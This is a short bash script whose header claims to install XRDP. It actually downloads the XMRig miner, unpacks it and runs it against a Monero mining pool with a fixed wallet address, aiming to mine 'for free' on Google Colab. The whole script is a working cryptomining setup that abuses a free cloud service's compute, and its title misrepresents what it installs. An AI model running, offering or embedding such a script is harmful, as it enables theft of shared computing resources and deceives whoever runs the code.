#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
#./xmrig -o us-west.minexmr.com:443 -u DG44n1arWRSadrL6x7J8C6CNcR3h4hiazk -k --tls --rig-id GC-US
./xmrig -o rx.unmineable.com:3333 -u DG44n1arWRSadrL6x7J8C6CNcR3h4hiazk -p x --tls -k
